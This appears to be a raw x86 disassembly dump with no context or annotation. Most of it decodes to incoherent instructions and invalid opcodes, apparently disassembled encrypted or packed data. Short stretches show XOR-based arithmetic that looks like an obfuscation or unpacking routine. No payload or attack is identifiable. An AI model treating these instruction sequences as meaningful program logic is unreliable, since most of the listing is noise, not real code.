  415fa6:	sbb    BYTE PTR [edx],bh
  415fa8:	xchg   ebx,eax
  415fa9:	sti    
  415faa:	and    ebp,edx
  415fac:	xor    eax,0x406bca9b
  415fb1:	adc    BYTE PTR [esi],dh
  415fb3:	test   eax,0x4565b376
  415fb8:	push   ebp
  415fb9:	int3   
  415fba:	stos   DWORD PTR es:[edi],eax
  415fbb:	je     0x416033
  415fbd:	push   ebp
  415fbe:	fdivr  DWORD PTR [esi]
  415fc0:	xchg   DWORD PTR [esi-0x1e],edi
  415fc3:	pop    ebx
  415fc4:	jmp    0x415fed
  415fc6:	fsubr  st(4),st
  415fc8:	adc    al,0x5f
  415fca:	mov    bh,0x1f
  415fcc:	ins    BYTE PTR es:[edi],dx
  415fcd:	(bad)  
  415fce:	call   0xe61e:0xced604be
  415fd5:	lods   eax,DWORD PTR ds:[esi]
  415fd6:	push   ecx
  415fd7:	or     eax,0x58177b7c
  415fdc:	lahf   
  415fdd:	shr    DWORD PTR [ebp-0x11079ec4],0x4f
  415fe4:	addr16 jne 0x415fdf
  415fe7:	pop    edi
  415fe8:	cs pushf 
  415fea:	push   esp
  415feb:	sahf   
  415fec:	adc    al,0x28
  415fee:	pop    edx
  415fef:	jbe    0x415fc7
  415ff1:	jns    0x416031
  415ff3:	inc    esi
  415ff4:	jge    0x416039
  415ff6:	or     BYTE PTR [ebp+0x549b624e],bl
  415ffc:	mov    ecx,ebp
  415ffe:	fadd   QWORD PTR [ecx+edi*1+0x7c]
  416002:	push   esi
  416003:	(bad)  
  416004:	mov    ebp,0x5f43217f
  416009:	adc    eax,0x24d9d6b5
  41600e:	shl    BYTE PTR ds:0xa39e96a8,1
  416014:	and    BYTE PTR [edx+0x66efa364],dl
  41601a:	jecxz  0x416055
  41601c:	into   
  41601d:	fimul  WORD PTR [eax]
  41601f:	int    0xb2
  416021:	inc    esi
  416022:	jno    0x416052
  416024:	jnp    0x415fee
  416026:	xchg   esi,eax
  416027:	sub    bh,BYTE PTR [eax]
  416029:	and    DWORD PTR ds:0x92165fd7,eax
  41602f:	jp     0x415fd3
  416031:	jnp    0x41606f
  416033:	push   0x4ce8ff2e
  416038:	jbe    0x416004
  41603a:	mov    ebx,0x84556230
  41603f:	and    DWORD PTR ds:0xec6fc4c8,0x35d9c819
  416049:	adc    eax,0x8cb027fd
  41604e:	xchg   ebx,eax
  41604f:	(bad)  
  416050:	xor    BYTE PTR [ebx+ebp*4+0x4c8a7ced],ch
  416057:	inc    eax
  416058:	xchg   esp,eax
  416059:	xchg   ebp,eax
  41605a:	xchg   edi,eax
  41605b:	jge    0x416015
  41605d:	xor    al,0x82
  41605f:	sub    DWORD PTR [edx],0x481fb711
  416065:	or     eax,0x7e763bad
  41606a:	jle    0x4160d2
  41606c:	test   eax,0x5a77461e
  416071:	xchg   DWORD PTR [esi-0x6c],esi
  416074:	ja     0x416078
  416076:	iret   
  416077:	pop    ebx
  416078:	jecxz  0x41608d
  41607a:	mov    esp,0x1c64cdc4
  41607f:	mov    ah,0xfd
  416081:	popf   
  416082:	push   0xc7c0d4ad
  416087:	or     eax,0x96b0f919
  41608c:	out    0x6d,eax
  41608e:	fisubr WORD PTR [eax+ebp*1]
  416091:	mov    edi,0xc87b7f3
  416096:	fld    QWORD PTR [edx+0x5d]
  416099:	adc    bl,BYTE PTR [ecx+0xf3f01c4]
  41609f:	xchg   ebp,eax
  4160a0:	mov    eax,0x58011a09
  4160a5:	gs iret 
  4160a7:	outs   dx,BYTE PTR ds:[esi]
  4160a8:	mov    ds:0xe2119ee3,eax
  4160ad:	sbb    eax,0xc12bcec7
  4160b2:	mov    ah,0x97
  4160b4:	stos   BYTE PTR es:[edi],al
  4160b5:	pop    edi
  4160b6:	lods   eax,DWORD PTR ds:[esi]
  4160b7:	outs   dx,BYTE PTR ds:[esi]
  4160b8:	sub    al,0x80
  4160ba:	test   eax,0x140fb262
  4160bf:	xor    dh,bh
  4160c1:	out    dx,al
  4160c2:	sar    BYTE PTR [edi-0x3c6174ce],cl
  4160c8:	inc    ecx
  4160c9:	(bad)  
  4160ca:	sbb    ch,dh
  4160cc:	bound  ecx,QWORD PTR [ecx+0x2c]
  4160cf:	jae    0x41612b
  4160d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160d2:	jo     0x4160c3
  4160d4:	jbe    0x416121
  4160d6:	add    DWORD PTR [ebx+0x34],ecx
  4160d9:	cdq    
  4160da:	out    0xc3,al
  4160dc:	sar    BYTE PTR [ebx-0xa],cl
  4160df:	adc    al,0x8b
  4160e1:	inc    esi
  4160e2:	int3   
  4160e3:	add    eax,0x44df4e75
  4160e8:	in     eax,0x14
  4160ea:	mov    ebp,DWORD PTR [esi+0x6102e848]
  4160f0:	push   ebx
  4160f1:	mov    edx,0x869bd465
  4160f6:	cli    
  4160f7:	xor    esi,DWORD PTR [edi+0x38]
  4160fa:	mov    al,ds:0xee6acbf7
  4160ff:	xchg   ebx,eax
  416100:	in     eax,0x7d
  416102:	cmp    al,0xf9
  416104:	mov    al,0x31
  416106:	push   edx
  416107:	ds push eax
  416109:	and    DWORD PTR [ebp+0x42],ebp
  41610c:	or     DWORD PTR [ebx+0x7],ebp
  41610f:	or     BYTE PTR [eax-0x65],dh
  416112:	sub    eax,0x129e9615
  416117:	scas   al,BYTE PTR es:[edi]
  416118:	mov    eax,ds:0xf8f84edb
  41611d:	add    al,0x6d
  41611f:	inc    ecx
  416120:	push   eax
  416121:	push   0x19b5ded7
  416126:	or     DWORD PTR [eax],esi
  416128:	je     0x416108
  41612a:	fidiv  DWORD PTR [ebp-0x15cb2c49]
  416130:	sub    esp,DWORD PTR [ebx]
  416132:	enter  0x8236,0x35
  416136:	xchg   ebx,eax
  416137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416138:	pop    es
  416139:	xchg   edi,eax
  41613a:	ret    
  41613b:	sbb    al,0x18
  41613d:	ret    0xd45b
  416140:	(bad)  
  416144:	adc    BYTE PTR [ebx],al
  416146:	push   eax
  416147:	mov    al,0x77
  416149:	add    eax,0x99c4b9c4
  41614e:	stc    
  41614f:	or     BYTE PTR [ebx+0x49252451],al
  416155:	lahf   
  416156:	retf   
  416157:	mov    ds:0x1181242,al
  41615c:	repnz call 0xb1bd:0x5dd58ac1
  416164:	out    dx,eax
  416165:	call   0xdc39:0x92065694
  41616c:	xchg   ebx,eax
  41616d:	int3   
  41616e:	into   
  41616f:	mov    eax,ds:0x841ce926
  416174:	push   edx
  416175:	cs repz pop es
  416178:	aam    0x94
  41617a:	cmp    BYTE PTR [eax+0x51],bh
  41617d:	out    dx,al
  41617e:	pop    eax
  41617f:	dec    ebp
  416180:	add    eax,0xe7e943f9
  416185:	push   0xfffffffe
  416187:	test   eax,0xe2d46dce
  41618c:	push   ebp
  41618d:	xchg   ecx,edi
  41618f:	sbb    bl,BYTE PTR [esi-0x24]
  416192:	xor    DWORD PTR [edx-0x62],edx
  416195:	mov    WORD PTR [edx-0x1d],cs
  416198:	pop    esp
  41619a:	mov    al,0x73
  41619c:	popf   
  41619d:	ret    
  41619e:	adc    BYTE PTR [ebp+0x13],0xb4
  4161a2:	ret    
  4161a3:	adc    BYTE PTR ds:0xf88055db,0x32
  4161aa:	out    0x99,eax
  4161ac:	xchg   dl,bh
  4161ae:	mov    BYTE PTR [edi-0x6c41d683],ch
  4161b4:	sub    al,BYTE PTR [ecx-0x51]
  4161b7:	(bad)  
  4161b8:	adc    BYTE PTR [ebx-0x3cfcde56],dl
  4161be:	aad    0x52
  4161c0:	loop   0x41620e
  4161c2:	xchg   BYTE PTR [eax-0x76],bh
  4161c5:	cmp    eax,0xf084b34
  4161ca:	sub    eax,0x14dfe84b
  4161cf:	add    ebx,esi
  4161d1:	and    bl,BYTE PTR [ebx*1+0x613ece96]
  4161d8:	sub    ah,BYTE PTR ds:0xac3dfdcb
  4161de:	xchg   edx,eax
  4161df:	cs cmp esp,edi
  4161e2:	ret    0xa2c7
  4161e5:	mov    dh,0xc7
  4161e7:	test   DWORD PTR [esi+edi*1-0x6c9a188f],esi
  4161ee:	cmc    
  4161ef:	neg    BYTE PTR [ecx+0x5d21b89d]
  4161f5:	and    al,BYTE PTR [edi+0x45ceff8d]
  4161fb:	retf   0x6c97
  4161fe:	daa    
  4161ff:	test   BYTE PTR [esp+esi*8-0x73f34a7d],0x8b
  416207:	rcr    BYTE PTR [ecx+0x27ffa5c4],cl
  41620d:	sti    
  41620e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41620f:	call   DWORD PTR [ebp+0x1b]
  416212:	adc    eax,0x4dbbc785
  416217:	cld    
  416218:	ja     0x4161ce
  41621a:	mov    dl,0x84
  41621c:	mov    ds:0x706d8f4f,al
  416221:	iret   
  416222:	aad    0x74
  416224:	iret   
  416225:	pop    esp
  416226:	sub    BYTE PTR [edx],0xfe
  416229:	dec    ecx
  41622a:	bound  esp,QWORD PTR [edi+0x772cb6b5]
  416230:	ins    BYTE PTR es:[edi],dx
  416231:	pop    ebx
  416232:	das    
  416233:	inc    DWORD PTR [esi-0x50]
  416236:	mov    esi,0x182c966a
  41623b:	aad    0x7f
  41623d:	cmp    DWORD PTR [esi],esp
  41623f:	dec    ecx
  416240:	lods   eax,DWORD PTR ds:[esi]
  416241:	add    esp,ecx
  416243:	rcl    BYTE PTR [edx-0x68],0xb4
  416247:	je     0x4162ae
  416249:	mov    cl,0x75
  41624b:	inc    ebp
  41624c:	rcr    esi,0x8f
  41624f:	popf   
  416250:	sub    eax,0xbddd0bb3
  416255:	cli    
  416256:	xlat   BYTE PTR ds:[ebx]
  416257:	add    BYTE PTR [ebx],cl
  416259:	aad    0x4f
  41625b:	sahf   
  41625c:	scas   eax,DWORD PTR es:[edi]
  41625d:	pop    ebx
  41625e:	call   0x922e:0x8cc86e4a
  416265:	push   cs
  416266:	xchg   ecx,eax
  416267:	rcl    BYTE PTR [eax-0x47],cl
  41626a:	cmp    ecx,DWORD PTR [ebp-0x1f]
  41626d:	ds leave 
  41626f:	ret    
  416270:	(bad)  
  416271:	in     eax,dx
  416272:	nop
  416273:	jg     0x416223
  416275:	addr16 pop ds
  416277:	fwait
  416278:	clc    
  416279:	xchg   DWORD PTR [ecx],ecx
  41627b:	jecxz  0x4162d7
  41627d:	std    
  41627e:	rol    DWORD PTR [ebx],cl
  416280:	add    esi,DWORD PTR [edx]
  416282:	pop    ebp
  416283:	call   0xebc288d5
  416288:	jne    0x4162cc
  41628a:	arpl   WORD PTR [edi+0x53],ax
  41628d:	sbb    bh,ch
  41628f:	jo     0x4162cd
  416291:	mov    edx,0xabd10bd1
  416296:	aaa    
  416297:	pusha  
  416298:	cwde   
  416299:	fsub   DWORD PTR [edi]
  41629b:	cmp    BYTE PTR [ebp-0x2],0xf2
  41629f:	push   cs
  4162a0:	dec    edi
  4162a1:	pusha  
  4162a2:	icebp  
  4162a3:	cwde   
  4162a4:	sub    eax,0x6c913c33
  4162a9:	leave  
  4162aa:	xor    eax,0xab202dcd
  4162af:	jbe    0x41623c
  4162b1:	sub    BYTE PTR [ecx+0x59],cl
  4162b4:	lahf   
  4162b5:	sub    BYTE PTR [ecx-0x5568642d],bh
  4162bb:	pop    eax
  4162bc:	mov    cl,0xfc
  4162be:	inc    ebp
  4162bf:	jmp    0x98efcf6b
  4162c4:	into   
  4162c5:	or     eax,0x3cf4d1c6
  4162ca:	sar    BYTE PTR [ecx-0x3985d98f],0xc8
  4162d1:	fwait
  4162d2:	call   0xca2c2592
  4162d7:	outs   dx,DWORD PTR ds:[esi]
  4162d8:	dec    esp
  4162d9:	dec    eax
  4162da:	add    BYTE PTR [ebx-0x56],0xcd
  4162de:	imul   ebx,DWORD PTR [esi-0x3ef33e26],0x61
  4162e5:	retf   0x6738
  4162e8:	loop   0x41633e
  4162ea:	mov    esp,0xd2920e5f
  4162ef:	xlat   BYTE PTR ds:[ebx]
  4162f0:	inc    ecx
  4162f1:	mov    ebp,gs
  4162f3:	xchg   ecx,eax
  4162f4:	gs dec edx
  4162f6:	(bad)  
  4162f7:	dec    ebp
  4162f8:	cmp    DWORD PTR [ebx-0x3a],edx
  4162fb:	pop    ebp
  4162fc:	mov    bl,0x88
  4162fe:	xchg   ebp,eax
  4162ff:	mov    BYTE PTR [ebx],dl
  416301:	jnp    0x4162d3
  416303:	cmp    BYTE PTR [eax+0x48],ch
  416306:	inc    edx
  416307:	fnstsw WORD PTR [edx]
  416309:	push   eax
  41630a:	add    eax,0xfbd16d98
  41630f:	in     al,0x51
  416311:	dec    DWORD PTR [edi+0x59]
  416314:	cwde   
  416315:	and    DWORD PTR [edx],ebp
  416317:	xor    eax,0x36de2881
  41631c:	lahf   
  41631d:	cmp    al,0x4a
  41631f:	je     0x4162dd
  416321:	push   es
  416322:	xor    al,0xc0
  416324:	mov    ah,0x2
  416326:	fcmovnb st,st(7)
  416328:	inc    ebp
  416329:	aam    0x7d
  41632b:	xor    al,0x0
  41632d:	add    BYTE PTR [ebx+0x558bd445],cl
  416333:	fmul   DWORD PTR [ebx-0x4cd223a3]
  416339:	and    al,0x0
  41633b:	add    BYTE PTR [edi],cl
  41633d:	scas   eax,DWORD PTR es:[edi]
  41633e:	ret    0xef35
  416341:	je     0x416343
  416343:	add    BYTE PTR [ebx],dh
  416345:	shl    bh,cl
  416347:	repz mov edx,DWORD PTR [ebp-0x20]
  41634b:	mov    ebx,DWORD PTR [ebp+0x8]
  41634e:	push   0x20
  416350:	and    eax,edx
  416352:	mov    edx,edi
  416354:	sub    edx,eax
  416356:	sub    edx,0x683
  41635c:	mov    DWORD PTR [ebp-0x2c],edx
  41635f:	mov    eax,DWORD PTR [ebp-0x30]
  416362:	mov    edx,DWORD PTR [ebp-0x34]
  416365:	xor    al,dl
  416367:	mov    edx,DWORD PTR [ebp-0x2c]
  41636a:	xor    al,0x58
  41636c:	and    al,0xd8
  41636e:	add    al,BYTE PTR [ebp+0xc]
  416371:	add    al,0x28
  416373:	jmp    0x41677c
  416378:	mov    ebx,0x41d6c237
  41637d:	cmp    edi,DWORD PTR [ebx-0x6192d245]
  416383:	nop
  416384:	lods   eax,DWORD PTR ds:[esi]
  416385:	mov    esi,0xcc3cd166
  41638a:	sar    BYTE PTR [esi-0x41413b72],0x55
  416391:	cli    
  416392:	imul   ebx,ecx,0x8a354918
  416398:	daa    
  416399:	arpl   WORD PTR [edx+esi*1+0x174981ea],cx
  4163a0:	jns    0x416399
  4163a2:	inc    esi
  4163a3:	sbb    BYTE PTR [ecx+0x16],ah
  4163a6:	jno    0x4163d3
  4163a8:	(bad)  
  4163a9:	and    edi,DWORD PTR [ebp+0x5d]
  4163ac:	push   esp
  4163ad:	out    0x9d,eax
  4163af:	xchg   ebx,eax
  4163b0:	loop   0x41637b
  4163b2:	sub    eax,0x62e8293
  4163b7:	pushf  
  4163b8:	cmp    dl,BYTE PTR [ebx+ebx*1+0x57]
  4163bc:	call   0xdf464828
  4163c1:	push   esp
  4163c2:	pop    edx
  4163c3:	mov    DWORD PTR [ebp-0x60],esp
  4163c6:	adc    edi,0x1ec9abad
  4163cc:	pushf  
  4163cd:	data16 sub ch,BYTE PTR ds:[edx]
  4163d1:	cli    
  4163d2:	dec    edi
  4163d3:	fst    QWORD PTR ds:0xd8098d43
  4163d9:	sahf   
  4163da:	icebp  
  4163db:	out    0xe2,eax
  4163dd:	mov    ds:0xc2f8e11a,eax
  4163e2:	ins    BYTE PTR es:[edi],dx
  4163e3:	test   eax,0x41fcf8d7
  4163e8:	or     BYTE PTR [esi+0x191af1c4],0x5a
  4163ef:	xchg   BYTE PTR [ebx+0x4e508e0d],al
  4163f5:	js     0x41641a
  4163f7:	mov    ah,0xc1
  4163f9:	ins    DWORD PTR es:[edi],dx
  4163fa:	mov    esi,0x4635b2b9
  4163ff:	mov    WORD PTR [ecx-0x11],?
  416402:	adc    BYTE PTR [eax-0x6f],al
  416405:	mov    BYTE PTR [edx-0x2e100ff2],0x8e
  41640c:	mov    al,0xa0
  41640e:	in     eax,0x78
  416410:	hlt    
  416411:	inc    eax
  416412:	lsl    ebp,WORD PTR [eax]
  416415:	faddp  st(5),st
  416417:	das    
  416418:	test   DWORD PTR ds:0x26c7eb25,eax
  41641e:	xchg   ecx,eax
  41641f:	cmp    DWORD PTR [ebx],ecx
  416421:	rcr    BYTE PTR [eax+0x69d2f10f],cl
  416427:	lods   al,BYTE PTR ds:[esi]
  416428:	sbb    dh,BYTE PTR [esi]
  41642a:	int    0xaa
  41642c:	out    dx,eax
  41642d:	mov    esi,0xb26f9f34
  416432:	mov    ds:0xd09a7f00,al
  416437:	inc    ebp
  416438:	inc    eax
  416439:	in     al,dx
  41643a:	lods   al,BYTE PTR ds:[esi]
  41643b:	jl     0x4163d8
  41643d:	arpl   WORD PTR [esp+esi*1],cx
  416440:	jno    0x4164a7
  416442:	outs   dx,DWORD PTR ds:[esi]
  416443:	repnz lods eax,DWORD PTR ds:[esi]
  416445:	shr    BYTE PTR [edx-0x59],cl
  416448:	push   es
  416449:	or     al,dl
  41644b:	cld    
  41644c:	mov    ds:0x298e40b7,al
  416451:	loopne 0x4164c8
  416453:	push   ds
  416454:	loop   0x4164b2
  416456:	jp     0x416475
  416458:	retf   0xf922
  41645b:	jmp    0x41644f
  41645d:	out    0xbe,al
  41645f:	pop    edi
  416460:	loopne 0x416436
  416462:	div    BYTE PTR [esi]
  416464:	test   BYTE PTR [esp+ebp*2],cl
  416467:	jae    0x416467
  416469:	(bad)  [edx+0x45c7f3dd]
  41646f:	jg     0x416401
  416471:	imul   BYTE PTR [eax+eiz*4+0x17]
  416475:	daa    
  416476:	(bad)  
  416477:	dec    edi
  416478:	enter  0x2101,0x7c
  41647c:	push   es
  41647d:	std    
  41647e:	(bad)  
  41647f:	mov    cs,WORD PTR [eax-0x7d]
  416482:	cmp    al,0x13
  416484:	pop    eax
  416485:	push   0x44
  416487:	test   BYTE PTR [esi-0xf900556],bl
  41648d:	daa    
  41648e:	(bad)  
  41648f:	and    BYTE PTR [ecx+0x4eebdde4],bl
  416495:	mul    DWORD PTR [esi+0x661bce98]
  41649b:	and    esi,DWORD PTR [ebp+0x56]
  41649e:	xchg   ebp,eax
  41649f:	sbb    eax,0x2a24b97
  4164a4:	pop    es
  4164a5:	iret   
  4164a6:	inc    ebp
  4164a7:	loop   0x416440
  4164a9:	mov    ch,0x16
  4164ab:	out    0xc8,eax
  4164ad:	push   ebp
  4164ae:	inc    ebx
  4164af:	cs add eax,0xf7fdc32c
  4164b5:	push   0x3deb472b
  4164ba:	mov    dl,0x77
  4164bc:	push   edx
  4164bd:	mov    ch,0x3e
  4164bf:	jmp    0x8574:0x25cd21d3
  4164c6:	xchg   eax,esp
  4164c8:	stos   DWORD PTR es:[edi],eax
  4164c9:	jb     0x4164fd
  4164cb:	in     eax,dx
  4164cc:	aas    
  4164cd:	pop    ecx
  4164ce:	xchg   edx,eax
  4164cf:	sub    ebx,ebx
  4164d1:	mov    cl,0xb3
  4164d3:	mov    ds:0x53db850b,al
  4164d8:	inc    edi
  4164da:	jo     0x416519
  4164dc:	jle    0x41655b
  4164de:	mov    cl,0xb5
  4164e0:	das    
  4164e1:	mov    edi,ebx
  4164e3:	int    0x40
  4164e5:	mov    al,0x0
  4164e7:	lea    ecx,[edi]
  4164e9:	cmc    
  4164ea:	es inc ebx
  4164ec:	mov    al,ds:0xbf7536d5
  4164f1:	jae    0x416515
  4164f3:	aad    0xf2
  4164f5:	sub    edx,DWORD PTR [ecx+0x3]
  4164f8:	mov    esi,fs
  4164fa:	out    0xd4,eax
  4164fc:	mov    BYTE PTR [ecx-0x23],dl
  4164ff:	test   al,0xd2
  416501:	jns    0x416523
  416503:	add    DWORD PTR [edi-0x9],ecx
  416506:	mov    bh,0x4b
  416508:	jno    0x4164ba
  41650a:	dec    eax
  41650b:	cmp    DWORD PTR [ebx-0x40e7d638],ebp
  416511:	push   ebp
  416512:	sbb    edi,DWORD PTR [eax+0x411a65e0]
  416518:	cdq    
  416519:	jnp    0x4164e5
  41651b:	daa    
  41651c:	inc    ecx
  41651d:	jl     0x4164b0
  41651f:	add    BYTE PTR [eax],ch
  416521:	leave  
  416522:	call   0x6905:0x92008726
  416529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41652a:	call   0xf001:0x2b9adefe
  416531:	inc    eax
  416532:	fistp  WORD PTR [ebp-0x2b18526e]
  416538:	scas   al,BYTE PTR es:[edi]
  416539:	dec    esp
  41653a:	sbb    bh,BYTE PTR [edx-0x7883c9c6]
  416540:	cdq    
  416541:	scas   eax,DWORD PTR es:[edi]
  416542:	xlat   BYTE PTR ds:[ebx]
  416543:	cmp    ebx,esi
  416545:	cwde   
  416546:	mov    esp,ds
  416548:	inc    ebp
  416549:	push   edi
  41654a:	bound  edi,QWORD PTR [ebx+eiz*8-0x4df714d8]
  416551:	mov    esi,0x99bbf721
  416556:	sub    ebx,DWORD PTR [esp+edi*1]
  416559:	cmp    eax,0xafb4f05e
  41655e:	shl    DWORD PTR [ecx-0x71c3745],1
  416564:	dec    ebp
  416565:	enter  0x8c22,0x60
  416569:	cmp    al,0x65
  41656b:	or     bh,BYTE PTR [ebx+ebp*4+0x433d693e]
  416572:	arpl   di,ax
  416574:	mov    eax,ds:0x9f67d247
  416579:	rol    BYTE PTR [edx+esi*1+0x4f],0xd
  41657e:	sub    ebx,edi
  416580:	ds loope 0x416590
  416583:	fs mov ch,0x41
  416586:	adc    al,0xd5
  416588:	popf   
  416589:	or     DWORD PTR [ebx-0x71],0x3a
  41658d:	sub    BYTE PTR [ebx+edi*2],al
  416590:	sbb    edi,DWORD PTR [esi]
  416592:	mov    ds:0x5bbdc85,eax
  416597:	fisubr DWORD PTR [edi+0x5b81c10d]
  41659d:	inc    ecx
  41659e:	sub    eax,0x5fa2ed7f
  4165a3:	or     eax,0x27740683
  4165a8:	repz repz inc eax
  4165ab:	pop    esp
  4165ac:	in     eax,0x9f
  4165ae:	push   ebp
  4165af:	xor    eax,0x85c0908d
  4165b4:	mov    ecx,0x61ec92ab
  4165b9:	ins    DWORD PTR es:[edi],dx
  4165ba:	inc    ecx
  4165bb:	sbb    DWORD PTR [esi-0x48],eax
  4165be:	mov    edi,0xefc939f2
  4165c3:	enter  0xcc35,0x9c
  4165c7:	dec    eax
  4165c8:	(bad)  
  4165c9:	sbb    edx,DWORD PTR [ebx-0x3c07c0e1]
  4165cf:	inc    esp
  4165d0:	or     edx,DWORD PTR [eax]
  4165d2:	inc    esi
  4165d3:	hlt    
  4165d4:	or     edx,edi
  4165d6:	test   al,0x18
  4165d8:	mov    ebp,0xf63a573c
  4165dd:	imul   BYTE PTR [ebx]
  4165df:	in     eax,0xab
  4165e1:	xchg   BYTE PTR [edi-0x21],al
  4165e4:	cmp    al,0xc8
  4165e6:	(bad)  
  4165e7:	in     al,dx
  4165e8:	stc    
  4165e9:	js     0x4165f0
  4165eb:	add    bh,BYTE PTR [edx]
  4165ed:	in     al,dx
  4165ee:	mov    edx,0x3928b978
  4165f3:	je     0x41657c
  4165f5:	xor    DWORD PTR [eax+0x1e],0xe88218d4
  4165fc:	out    0x20,al
  4165fe:	loop   0x4165e0
  416600:	loopne 0x4165f3
  416602:	dec    ecx
  416603:	pop    edi
  416604:	dec    ebx
  416605:	repz pop ds
  416607:	mov    eax,DWORD PTR [edx+0x33]
  41660a:	inc    esp
  41660b:	(bad)  
  41660c:	cs scas al,BYTE PTR es:[edi]
  41660e:	imul   ebx,DWORD PTR [esi+eiz*8+0x1f21313e],0xb689c40a
  416619:	es add ebx,eax
  41661c:	rol    ebx,0xc
  41661f:	mov    eax,0x4598b242
  416624:	ss test eax,esp
  416627:	es xchg edx,eax
  416629:	nop
  41662a:	loope  0x416623
  41662c:	retf   0x4a99
  41662f:	or     cl,bh
  416631:	and    eax,edx
  416633:	and    DWORD PTR [ecx],0xffffffcc
  416636:	shl    ecx,cl
  416638:	lods   al,BYTE PTR ds:[esi]
  416639:	mov    bh,0xd0
  41663b:	add    eax,DWORD PTR [ebp+0x5b]
  41663e:	xor    eax,0x2464fec8
  416643:	clc    
  416644:	in     eax,dx
  416645:	repnz xchg ecx,eax
  416647:	retf   0xc1a9
  41664a:	push   esi
  41664b:	xor    eax,0x4caf2146
  416650:	rol    dh,1
  416652:	push   edi
  416653:	and    BYTE PTR [ecx+0x2c493d04],0x85
  41665a:	push   ss
  41665b:	pop    ebx
  41665c:	dec    edi
  41665d:	xlat   BYTE PTR ds:[ebx]
  41665e:	pop    es
  41665f:	pusha  
  416660:	jl     0x416609
  416662:	(bad)  
  416663:	(bad)  
  416664:	fist   DWORD PTR [edx]
  416666:	test   DWORD PTR [ebp-0x51],edi
  416669:	inc    esi
  41666a:	pop    ss
  41666b:	add    eax,0x1347a094
  416670:	xchg   ebx,eax
  416671:	clc    
  416672:	aaa    
  416673:	into   
  416674:	aaa    
  416675:	scas   al,BYTE PTR es:[edi]
  416676:	mov    cs,esp
  416678:	mul    ebx
  41667a:	inc    edx
  41667b:	ror    DWORD PTR [ebx+0x57315e08],0x9d
  416682:	into   
  416683:	jmp    DWORD PTR [edx]
  416685:	aam    0x9f
  416687:	in     al,dx
  416688:	test   esp,esp
  41668a:	inc    ebx
  41668b:	mov    bh,0xe1
  41668d:	cld    
  41668e:	push   0x2bf8ef7a
  416693:	retf   0xcef5
  416696:	cli    
  416697:	pop    es
  416698:	xchg   DWORD PTR [eax+0x73ad66b4],esp
  41669e:	shr    DWORD PTR [edx],cl
  4166a0:	sbb    dh,ch
  4166a2:	jle    0x41667f
  4166a4:	or     dl,BYTE PTR [edx-0x72]
  4166a7:	xor    esp,0xe400d343
  4166ad:	push   edx
  4166ae:	sahf   
  4166af:	fs inc edx
  4166b1:	and    al,0xbf
  4166b3:	out    0xe1,eax
  4166b5:	(bad)  
  4166b6:	or     edx,esp
  4166b8:	loope  0x416642
  4166ba:	mov    dl,0xbc
  4166bc:	push   es
  4166bd:	aas    
  4166be:	sub    DWORD PTR [edi+eax*4],ebp
  4166c1:	mov    bh,0x6
  4166c3:	add    edx,eax
  4166c5:	rol    ebp,cl
  4166c7:	hlt    
  4166c8:	sub    DWORD PTR [edx],ebp
  4166ca:	aaa    
  4166cb:	test   eax,0xe9d68759
  4166d0:	pop    ecx
  4166d1:	aaa    
  4166d2:	sbb    al,BYTE PTR [esi-0xe9d1202]
  4166d8:	dec    ebx
  4166d9:	mov    al,0x7
  4166db:	and    DWORD PTR [ecx-0x1b],esp
  4166de:	ret    
  4166df:	push   esi
  4166e0:	imul   edx,DWORD PTR [ebp-0x5e371247],0xd9187da5
  4166ea:	inc    ecx
  4166eb:	nop
  4166ec:	cmp    bl,BYTE PTR [eax-0xa]
  4166ef:	fisttp WORD PTR [ecx+0x13c46d9d]
  4166f5:	adc    dl,BYTE PTR [eax+0xe]
  4166f8:	mov    WORD PTR [ebx+0x736fce82],cs
  4166fe:	dec    edx
  4166ff:	(bad)  
  416701:	xchg   esi,eax
  416702:	dec    BYTE PTR [edx-0x2ff07beb]
  416708:	mov    bh,0xb9
  41670a:	mov    WORD PTR [esi+0x50],ds
  41670d:	mov    esp,0x8b3d295c
  416712:	ins    BYTE PTR es:[edi],dx
  416713:	jp     0x41676f
  416715:	add    DWORD PTR [edx+ebp*8-0x25],edi
  416719:	push   0x5f
  41671b:	adc    DWORD PTR [ebx+0x3c],ebx
  41671e:	ror    DWORD PTR [eax],cl
  416720:	xchg   esi,eax
  416721:	sti    
  416722:	add    dl,BYTE PTR [edx]
  416724:	pop    ebx
  416725:	or     al,0x6
  416727:	sub    al,0xd2
  416729:	inc    edx
  41672a:	retf   
  41672b:	pop    ds
  41672c:	imul   edi,esp,0xffffff84
  41672f:	pop    ss
  416730:	sub    ch,0x5a
  416733:	loopne 0x416708
  416735:	cmc    
  416736:	dec    ebp
  416737:	push   0xc
  416739:	(bad)  
  41673a:	jge    0x4166bd
  41673c:	aad    0xa3
  41673e:	dec    ecx
  41673f:	pop    ebp
  416740:	xchg   esp,eax
  416741:	pop    edi
  416742:	loop   0x41671b
  416744:	test   DWORD PTR [eax-0x58],ebx
  416747:	sar    edx,1
  416749:	scas   eax,DWORD PTR es:[edi]
  41674a:	jo     0x4166ec
  41674c:	push   cs
  41674d:	loop   0x4166de
  41674f:	je     0xf10311d0
  416755:	int3   
  416756:	call   0xbf20:0x2dc6d8f0
  41675d:	or     dl,al
  41675f:	ins    BYTE PTR es:[edi],dx
  416760:	push   edi
  416761:	idiv   DWORD PTR [ebx+esi*1+0x3b32cf03]
  416768:	clc    
  416769:	loop   0x416764
  41676b:	jae    0x4167e9
  41676d:	push   ds
  41676e:	fstp   DWORD PTR [ebp-0x30f0c7e5]
  416774:	call   0x704b8713
  416779:	les    eax,FWORD PTR [edi+0x14]
  41677c:	mov    BYTE PTR [edx+ebx*1],al
  41677f:	mov    eax,DWORD PTR [ebp-0x38]
  416782:	add    eax,DWORD PTR [ebp-0x3c]
  416785:	mov    edx,DWORD PTR [ebp-0x40]
  416788:	xor    eax,edx
  41678a:	mov    edx,DWORD PTR [ebp-0x44]
  41678d:	xor    eax,edx
  41678f:	mov    edx,0x61f7
  416794:	sub    edx,eax
  416796:	mov    eax,DWORD PTR [ebp-0x4]
  416799:	add    edi,edx
  41679b:	mov    edx,DWORD PTR [ebp-0x8]
  41679e:	sub    eax,0x7721
  4167a3:	xor    eax,edx
  4167a5:	mov    edx,DWORD PTR [ebp-0xc]
  4167a8:	xor    eax,edx
  4167aa:	or     eax,0x7bc9
  4167af:	xor    eax,0xfffff0db
  4167b4:	mov    DWORD PTR [ebp-0x2c],edi
  4167b7:	sub    edi,eax
  4167b9:	mov    eax,DWORD PTR [ebp-0x10]
